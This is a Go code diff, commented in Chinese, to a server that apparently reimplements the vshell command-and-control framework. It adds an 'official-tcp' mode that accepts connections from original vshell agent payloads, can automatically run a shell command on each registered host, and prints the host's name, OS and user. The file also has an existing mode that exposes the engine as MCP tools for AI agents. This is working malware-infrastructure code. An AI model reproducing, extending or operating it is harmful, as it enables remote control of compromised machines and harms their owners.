@@ -17,10 +17,13 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"net/http"
 	"os"
+	"time"
 
+	"vshell/c2engine"
 	"vshell/controllers"
 	"vshell/mcp"
 	"vshell/router"
@@ -58,6 +61,13 @@ func webBanner(cfg *utils.FullSettings) {
 func main() {
 	// `vshell-server mcp` 走 MCP stdio 模式：不启动 Web 面板，直接把引擎侧
 	// 的能力暴露成 MCP 工具（见 mcp/ 包与 docs/DEV.md）。
+	// `vshell-server official-tcp` 起一个**官方协议**的 tcp 服务端（R24）：
+	// 让原版 agent 载荷能直连复刻端。用法见 docs/PROTOCOL.md §2.7。
+	if len(os.Args) > 1 && os.Args[1] == "official-tcp" {
+		runOfficialTCP(os.Args[2:])
+		return
+	}
+
 	if len(os.Args) > 1 && os.Args[1] == "mcp" {
 		runMCPServer()
 		return
@@ -118,4 +128,45 @@ func runMCPServer() {
 		fmt.Fprintf(os.Stderr, "mcp: %v\n", err)
 		os.Exit(1)
 	}
+}
+
+// runOfficialTCP 启动官方协议的 tcp 服务端（用于与原版 agent 互操作验证）。
+//
+// 用法：vshell-server official-tcp [-listen 127.0.0.1:18650] [-vkey VKEY] [-salt SALT] [-cmd "id"]
+func runOfficialTCP(args []string) {
+	flagSet := flag.NewFlagSet("official-tcp", flag.ExitOnError)
+	addr := flagSet.String("listen", "127.0.0.1:18650", "监听地址")
+	vkey := flagSet.String("vkey", "vkey", "监听器 Vkey（agent 会用 md5(vkey) 应答）")
+	salt := flagSet.String("salt", "", "加密盐（帧密钥 = hex(md5(salt))）")
+	cmd := flagSet.String("cmd", "", "客户端注册后自动执行一条命令")
+	_ = flagSet.Parse(args)
+
+	srv := c2engine.NewOfficialTCPServer(*addr, *vkey, *salt)
+	if err := srv.Start(); err != nil {
+		fmt.Fprintf(os.Stderr, "official-tcp: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Printf("official-tcp listening on %s (vkey=%s)\n", *addr, *vkey)
+
+	if *cmd != "" {
+		go func() {
+			time.Sleep(3 * time.Second)
+			out, err := srv.RunCommand(*cmd, 20*time.Second)
+			if err != nil {
+				fmt.Printf("command %q failed: %v\n", *cmd, err)
+				return
+			}
+			fmt.Printf("command %q output: %s\n", *cmd, out)
+		}()
+	}
+	// 打印 client 注册信息，便于互操作验证
+	go func() {
+		for i := 0; i < 30; i++ {
+			time.Sleep(2 * time.Second)
+			if info := srv.ClientInfo(); len(info) > 0 {
+				fmt.Printf("client registered: host=%v os=%v user=%v\n", info["HostName"], info["OsName"], info["UserName"])
+			}
+		}
+	}()
+	select {}
 }
